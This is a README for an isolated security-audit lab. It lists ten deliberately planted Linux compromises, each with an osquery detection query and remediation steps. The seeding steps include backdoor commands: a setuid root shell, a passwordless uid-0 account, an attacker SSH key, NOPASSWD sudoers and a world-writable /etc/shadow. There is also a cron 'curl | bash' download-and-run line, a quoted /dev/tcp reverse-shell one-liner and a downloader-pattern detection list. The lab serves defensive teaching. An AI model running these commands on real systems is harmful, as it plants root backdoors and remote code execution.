# Security-Audit Lab — 10 osquery Detection Scenarios

> **Аудит безопасности / Security-audit teaching demo.**
> This lab boots a **Fleet** server plus one or more **Ubuntu 24.04 osquery
> agents**. When an agent starts with `SEED_VULNS=true`, the script
> [`agent/seed-vulnerabilities.sh`](agent/seed-vulnerabilities.sh) deliberately
> plants ten realistic security problems on that host — backdoor accounts, a
> SUID root shell, rogue services, SSH/cron persistence, a NOPASSWD sudoers
> backdoor, known-vulnerable software and a C2 beacon.
>
> Your job as the auditor: open Fleet → **Queries → Create/Live query**, point it
> at the seeded host, and run the SQL below to surface each finding — exactly as
> you would sweep a real fleet for compromise and misconfiguration. Every query
> is written to return **rows only when the vulnerability is present**, so an
> empty result set means "clean" and a non-empty one is your finding.
>
> All SQL is validated against the **osquery 5.23.0** schema (the version the
> lab agent ships). Copy-paste straight into the Fleet query console.
>
> ⚠️ **FOR ISOLATED TEACHING LABS ONLY. Never run the seed script on a real
> host — it intentionally weakens the machine.**

Each scenario below is detected by a **distinct osquery table / technique** so
the demo teaches breadth:

| # | Scenario | ATT&CK | Primary table |
|---|----------|--------|---------------|
| 1 | SUID backdoor shell | T1548.001 | `suid_bin` |
| 2 | Extra UID 0 / passwordless account | T1136.001, T1548 | `users` (+ `shadow`) |
| 3 | Weak SSHD config | T1098, T1556 | `augeas` |
| 4 | Rogue SSH authorized_keys | T1098.004 | `authorized_keys` |
| 5 | Cron persistence beacon | T1053.003 | `crontab` |
| 6 | Rogue bind-shell port | T1571 | `listening_ports` + `processes` |
| 7 | Process executing from /tmp | T1036.005 | `processes` |
| 8 | NOPASSWD sudoers + weak /etc/shadow | T1548.003, T1222.002 | `sudoers` (+ `file`) |
| 9 | Known-vulnerable software (CVE) | — | `python_packages` |
| 10 | Reverse-shell / C2 beacon | T1571, T1059.004 | `process_open_sockets` |

---

## 1. SUID/SGID backdoor shell

**Real-world framing.** *Abuse Elevation Control Mechanism: Setuid and Setgid*
(**MITRE ATT&CK [T1548.001](https://attack.mitre.org/techniques/T1548/001/)**).
Attackers who briefly hold root often plant a setuid-root copy of a shell so any
unprivileged account can later regain root instantly with `rootbash -p` — no
password, no exploit.

**The vulnerability.** `/usr/local/bin/rootbash` is a copy of `/bin/bash` owned
by `root` with the **setuid bit** set (`4755`). Executing it yields a root shell.

**How it's seeded.**
```bash
cp -f /bin/bash /usr/local/bin/rootbash
chown root:root /usr/local/bin/rootbash
chmod 4755 /usr/local/bin/rootbash
```

**Detection query.** `suid_bin` enumerates setuid/setgid binaries; legitimate
ones live in `/bin`, `/usr/bin`, `/usr/sbin`. Anything setuid-root under
`/usr/local` is suspicious:
```sql
SELECT path, username, groupname, permissions
FROM suid_bin
WHERE path LIKE '/usr/local/%'
  AND username = 'root';
```

**Expected result.** One row: `/usr/local/bin/rootbash`, owner `root`,
permissions flagged setuid (`S`).

**Remediation.** `rm /usr/local/bin/rootbash`; audit all SUID binaries
(`find / -perm -4000`), keep an allow-list, and alert on new setuid-root files.

---

## 2. Extra UID 0 account + passwordless login

**Real-world framing.** *Create Account: Local Account*
(**[T1136.001](https://attack.mitre.org/techniques/T1136/001/)**) combined with
account-manipulation persistence. Any account with **uid 0 is root**, regardless
of its name — a favourite stealthy backdoor because it hides in `/etc/passwd`.

**The vulnerability.** A second super-user `sysbackup` with **uid 0 / gid 0** and
an **empty password** (passwordless login permitted) has been added.

**How it's seeded.**
```bash
echo 'sysbackup:x:0:0:System Backup:/root:/bin/bash' >> /etc/passwd
echo 'sysbackup::20000:0:99999:7:::'                 >> /etc/shadow   # empty pw field
```

**Detection query.** Any uid 0 other than `root`:
```sql
SELECT uid, username, description, directory, shell
FROM users
WHERE uid = 0 AND username != 'root';
```
Bonus — find passwordless accounts via `shadow`:
```sql
SELECT username, password_status, hash_alg
FROM shadow
WHERE password_status = 'empty';
```

**Expected result.** `users` returns one row for `sysbackup` (uid 0); `shadow`
returns `sysbackup` with `password_status = 'empty'`.

**Remediation.** `userdel sysbackup` (or remove the `/etc/passwd` line); enforce
that only `root` has uid 0, and forbid empty passwords in PAM/`login.defs`.

---

## 3. Weak SSHD configuration

**Real-world framing.** Weak remote-access config enables *Valid Accounts /
credential-based access* (**[T1098](https://attack.mitre.org/techniques/T1098/)**,
**[T1556](https://attack.mitre.org/techniques/T1556/)**). `PermitRootLogin yes` +
`PasswordAuthentication yes` + `PermitEmptyPasswords yes` invites brute-force and
direct root compromise.

**The vulnerability.** `/etc/ssh/sshd_config` allows password-based root login and
empty passwords — the three most dangerous SSH directives, all on.

**How it's seeded.** The script sets (creating or rewriting each directive):
```bash
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
```

**Detection query.** osquery has no dedicated `sshd_config` table, but the
`augeas` table parses config files structurally (via the Sshd lens). Query the
file path and pick out the risky directives:
```sql
SELECT node, value
FROM augeas
WHERE path = '/etc/ssh/sshd_config'
  AND (
        (node LIKE '%PermitRootLogin'      AND value = 'yes') OR
        (node LIKE '%PasswordAuthentication' AND value = 'yes') OR
        (node LIKE '%PermitEmptyPasswords'   AND value = 'yes')
      );
```

**Expected result.** Up to three rows, one per risky directive set to `yes`
(e.g. `.../PermitRootLogin = yes`). On Ubuntu you'll see all three; on Oracle
Linux the default config already ships a `PasswordAuthentication` line, so augeas
indexes the duplicate as `PasswordAuthentication[1]` / `[2]` and the end-anchored
`LIKE` skips it — you still get `PermitRootLogin` + `PermitEmptyPasswords`, which
is a clear finding.

**Remediation.** Set `PermitRootLogin no`, `PasswordAuthentication no`,
`PermitEmptyPasswords no`; use key-based auth only and `systemctl reload ssh`.

---

## 4. Unauthorized SSH `authorized_keys`

**Real-world framing.** *Account Manipulation: SSH Authorized Keys*
(**[T1098.004](https://attack.mitre.org/techniques/T1098/004/)**). Appending an
attacker-controlled public key to `~/.ssh/authorized_keys` is one of the quietest,
most durable Linux persistence tricks — no new process, no new account.

**The vulnerability.** An attacker Ed25519 key
(`attacker@evil`) sits in `/root/.ssh/authorized_keys`, granting passwordless
root SSH from the attacker's machine.

**How it's seeded.**
```bash
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...  attacker@evil' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Detection query.** The `authorized_keys` table walks every user's home dir; join
`users` to attribute each key to an account:
```sql
SELECT u.username, ak.uid, ak.algorithm, ak.key_file, ak.comment
FROM authorized_keys ak
JOIN users u ON ak.uid = u.uid;
```

**Expected result.** A row for the `root` account showing an `ssh-ed25519` key in
`/root/.ssh/authorized_keys` with comment `attacker@evil`. Compare every returned
key against your known-good inventory — any unrecognised key is the finding.

**Remediation.** Remove the offending line from `authorized_keys`; centralise key
management, and monitor `authorized_keys` files for change.

---

## 5. Cron persistence / download-and-run beacon

**Real-world framing.** *Scheduled Task/Job: Cron*
(**[T1053.003](https://attack.mitre.org/techniques/T1053/003/)**). A cron entry
that pipes `curl` into `bash` re-fetches and runs attacker code on a schedule —
persistence plus a live C2 update channel.

**The vulnerability.** `/etc/cron.d/apache-backup` (innocuous name, malicious
payload) runs `curl … | bash` every 5 minutes as root.

**How it's seeded.**
```bash
cat > /etc/cron.d/apache-backup <<'EOF'
*/5 * * * * root curl -fsSL http://198.51.100.13/b.sh | bash > /dev/null 2>&1
EOF
```

**Detection query.** The `crontab` table parses `/etc/crontab`, `/etc/cron.d/*`
and per-user crontabs. Flag any command that fetches-and-executes:
```sql
SELECT path, minute, hour, command
FROM crontab
WHERE command LIKE '%curl%'
   OR command LIKE '%wget%'
   OR command LIKE '%| bash%'
   OR command LIKE '%/dev/tcp%';
```

**Expected result.** One row from `/etc/cron.d/apache-backup` with the
`curl … | bash` command scheduled `*/5`.

**Remediation.** Delete the cron file; alert on new files in `/etc/cron.d` and on
any cron command invoking a downloader piped to a shell.

---

## 6. Rogue listening service (bind shell)

**Real-world framing.** *Non-Standard Port / bind backdoor*
(**[T1571](https://attack.mitre.org/techniques/T1571/)**). A service bound to
`0.0.0.0:4444` (the archetypal Metasploit port) that isn't part of the host's
role is a classic bind-shell/backdoor listener.

**The vulnerability.** A Python listener holds `0.0.0.0:4444` open, accepting
inbound connections — an unauthorised network entry point.

**How it's seeded.** A small `backdoor-listener.py` is written to
`/usr/local/sbin/` and started detached:
```bash
setsid nohup python3 /usr/local/sbin/backdoor-listener.py &   # binds 0.0.0.0:4444
```

**Detection query.** Join `listening_ports` to `processes` to see *what* is
listening and *which binary* owns the socket:
```sql
SELECT lp.address, lp.port, lp.protocol, p.pid, p.name, p.path, p.cmdline
FROM listening_ports lp
JOIN processes p ON lp.pid = p.pid
WHERE lp.port = 4444;
```
More generally, hunt every listener and eyeball the unexpected ones by removing
the `port = 4444` filter.

**Expected result.** One row: TCP `0.0.0.0:4444` owned by a `python3` process
running `/usr/local/sbin/backdoor-listener.py`.

**Remediation.** Kill the process, remove the script; restrict egress/ingress
with a host firewall and alert on listeners outside the approved service list.

---

## 7. Process executing from a world-writable directory

**Real-world framing.** *Command and Scripting Interpreter / Masquerading:
Match Legitimate Name or Location*
(**[T1036.005](https://attack.mitre.org/techniques/T1036/005/)**). Legitimate
daemons run from `/usr/bin`, `/usr/sbin`, etc. Malware frequently stages in
world-writable `/tmp`, `/dev/shm` or `/var/tmp` and masquerades under a
system-looking name.

**The vulnerability.** A running process executes from
`/tmp/.systemd-private` — a dot-hidden binary in a world-writable dir pretending
to be a systemd helper.

**How it's seeded.**
```bash
cp -f /bin/sleep /tmp/.systemd-private
setsid nohup /tmp/.systemd-private 86400 &
```

**Detection query.** `processes.path` reveals where each running binary lives:
```sql
SELECT pid, name, path, cmdline, uid, start_time
FROM processes
WHERE path LIKE '/tmp/%'
   OR path LIKE '/dev/shm/%'
   OR path LIKE '/var/tmp/%';
```

**Expected result.** One row for the process whose `path` is
`/tmp/.systemd-private`.

**Remediation.** Kill the process and remove the binary; mount `/tmp` and
`/dev/shm` with `noexec,nosuid,nodev`, and alert on execution from
world-writable paths.

---

## 8. NOPASSWD sudoers backdoor + world-writable `/etc/shadow`

**Real-world framing.** *Abuse Elevation Control Mechanism: Sudo and Sudo Caching*
(**[T1548.003](https://attack.mitre.org/techniques/T1548/003/)**) plus *File and
Directory Permissions Modification*
(**[T1222.002](https://attack.mitre.org/techniques/T1222/002/)**). A
`NOPASSWD:ALL` sudo rule is instant password-free root; a world-writable
`/etc/shadow` lets *any* user overwrite password hashes (including root's).

**The vulnerability.** `/etc/sudoers.d/99-backdoor` grants `sysbackup` (the uid-0
account from scenario 2) `ALL=(ALL) NOPASSWD:ALL`, and `/etc/shadow` is mode
`0666` (world-writable) instead of the correct `0640`/`0600`.

**How it's seeded.**
```bash
echo 'sysbackup ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/99-backdoor
chmod 440 /etc/sudoers.d/99-backdoor
chmod 0666 /etc/shadow
```

**Detection query.** The `sudoers` table parses `/etc/sudoers` and its includes:
```sql
SELECT source, header, rule_details
FROM sudoers
WHERE rule_details LIKE '%NOPASSWD%';
```
Companion query — verify sensitive-file permissions via the `file` table (any
mode where "group/other" has write is wrong):
```sql
SELECT path, mode, uid, gid
FROM file
WHERE path = '/etc/shadow'
  AND mode NOT IN ('0640', '0600', '0400', '0000');
```

**Expected result.** `sudoers` returns the `NOPASSWD:ALL` rule for `sysbackup`;
`file` returns `/etc/shadow` with `mode = '0666'`.

**Remediation.** Remove the sudoers drop-in; `chmod 0640 /etc/shadow`
(`root:shadow`); run `visudo -c` and audit `/etc/sudoers.d/`.

---

## 9. Known-vulnerable software (CVE) in inventory

**Real-world framing.** Unpatched dependencies are the most common real-world
exposure. **Django 2.2.0** carries multiple well-known CVEs, e.g.
**CVE-2020-7471** (SQL injection via `StringAgg(delimiter=…)`),
**CVE-2019-14232/14233/14234/14235** (ReDoS / SQLi / deserialization), and
**CVE-2020-9402** (GIS SQLi). Fleet's software inventory feeds its
**Vulnerabilities** view, which maps installed versions to CVEs automatically.

**The vulnerability.** The Python package `Django 2.2.0` is installed — an
end-of-life release with published, exploitable CVEs.

**How it's seeded.** Tries `pip`, and falls back to a synthetic `dist-info` so
the package still shows in inventory **fully offline**:
```bash
pip3 install --break-system-packages 'Django==2.2.0' \
  || (mkdir -p <site-packages>/Django-2.2.0.dist-info \
      && printf 'Metadata-Version: 2.1\nName: Django\nVersion: 2.2.0\n' \
           > <site-packages>/Django-2.2.0.dist-info/METADATA)
```

**Detection query.** `python_packages` inventories installed Python distributions.
Note `pip` normalizes the version `2.2.0` → `2.2` (the `dist-info` is
`Django-2.2.dist-info`), so match the `2.2` line with `LIKE '2.2%'` (no dot):
```sql
SELECT name, version, path
FROM python_packages
WHERE name = 'Django' AND version LIKE '2.2%';
```
> **In Fleet:** also open **Host details → Software** and the fleet-wide
> **Vulnerabilities** page — Django 2.2.0 will be listed with its CVE IDs and
> CVSS scores (the vuln feed populates on the `FLEET_VULNERABILITIES_PERIODICITY`
> cycle). The same pattern applies to OS packages via the `deb_packages` table
> (e.g. an old `openssl`/`sudo`) — not seeded here to avoid network downloads,
> but `SELECT name, version FROM deb_packages WHERE name = 'sudo';` is the
> equivalent OS-package query.

**Expected result.** One row: `Django`, version `2.2` (pip-normalized from
`2.2.0`), with its site-packages path. In Fleet's Vulnerabilities view it resolves
to CVE-2020-7471 et al.

**Remediation.** Upgrade Django to a supported, patched release; track SBOM /
dependencies and act on Fleet's Vulnerabilities dashboard.

---

## 10. Reverse-shell / C2 beacon (established outbound connection)

**Real-world framing.** *Non-Standard Port* + *Command and Scripting Interpreter:
Unix Shell* (**[T1571](https://attack.mitre.org/techniques/T1571/)**,
**[T1059.004](https://attack.mitre.org/techniques/T1059/004/)**). A reverse
shell / C2 beacon makes a persistent **outbound** connection to attacker
infrastructure, evading inbound firewall rules.

**The vulnerability.** A `c2-beacon.py` process holds an **ESTABLISHED** outbound
TCP connection to a C2 on port **9001**. (In the lab the C2 is served locally by
`c2-sink.py` so the socket stays up offline; in the wild `remote_address` would be
the attacker's IP.)

**How it's seeded.** A local sink and the outbound beacon, both detached:
```bash
setsid nohup python3 /usr/local/sbin/c2-sink.py   &   # holds 127.0.0.1:9001
setsid nohup python3 /usr/local/sbin/c2-beacon.py &   # connects out to :9001, holds it open
```

**Detection query.** `process_open_sockets` shows per-process connections
including remote endpoint and state; join `processes` for attribution:
```sql
SELECT p.pid, p.name, p.cmdline,
       pos.local_address, pos.local_port,
       pos.remote_address, pos.remote_port, pos.state
FROM process_open_sockets pos
JOIN processes p ON pos.pid = p.pid
WHERE pos.state = 'ESTABLISHED'
  AND pos.remote_port = 9001;
```
> **Why the socket table, not `cmdline`?** A bash `bash -i >& /dev/tcp/HOST/PORT
> 0>&1` reverse shell hides the destination in shell *redirections*, which never
> appear in `processes.cmdline` (argv is just `bash -i`). The outbound socket is
> the reliable signal — that's the teaching point of this scenario.

**Expected result.** A row for the beacon process with `state = 'ESTABLISHED'`
and `remote_port = 9001`. In production, triage every ESTABLISHED connection to
an unexpected `remote_port` / non-RFC1918 `remote_address`.

**Remediation.** Kill the beacon process; enforce egress filtering / allow-list
outbound destinations, and alert on long-lived connections to unusual ports.

---

## Running the whole sweep

Paste any query above into **Fleet → Queries → Live query**, target the seeded
host, and **Run**. A quick triage order for an audit: 2 → 1 → 8 (privilege &
accounts) → 4 → 3 → 5 (persistence) → 6 → 10 (network) → 7 (execution) → 9
(patching). Empty result = clean for that check; any rows = investigate.
